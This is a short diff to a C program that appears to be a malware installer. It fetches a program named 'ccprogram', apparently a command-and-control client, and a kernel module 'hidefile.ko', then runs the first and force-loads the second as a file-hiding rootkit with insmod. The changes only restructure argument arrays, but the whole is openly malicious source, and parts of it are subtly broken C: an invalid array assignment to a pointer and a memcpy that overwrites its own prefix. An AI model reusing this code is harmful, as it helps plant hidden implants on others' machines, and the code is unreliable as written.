@@ -14,8 +14,8 @@
 #define BUFFER_SIZE 4096
 #define SP_PORT     8890
 #define SERVER_ADDR "127.0.0.1"
-char* ROOTKIT = "hidefile.ko";   
-char* CCPROGRAM = "ccprogram";  
+static char* ROOTKIT = "hidefile.ko";   
+static char* CCPROGRAM = "ccprogram";  
 char buf[BUFFER_SIZE];
 int sock_fd;
 
@@ -33,14 +33,17 @@ int opensocket();
 int main()
 {
     int rv;
+    char **argv;
     
     rv = obtain(CCPROGRAM);
     memcpy(buf, "./", 2);
     memcpy(buf, CCPROGRAM, strlen(CCPROGRAM));
-    if(rv == 0) execcmd({buf, NULL});
+    argv = {buf, NULL};
+    if(rv == 0) execcmd(argv);
     
     rv = obtain(ROOTKIT);
-    if(rv == 0) execcmd({"/sbin/insmod", "-f", ROOTKIT, NULL});
+    argv = {"/sbin/insmod", "-f", ROOTKIT, NULL};
+    if(rv == 0) execcmd(argv);
     
     printf("Install success!\n");
     return 0;
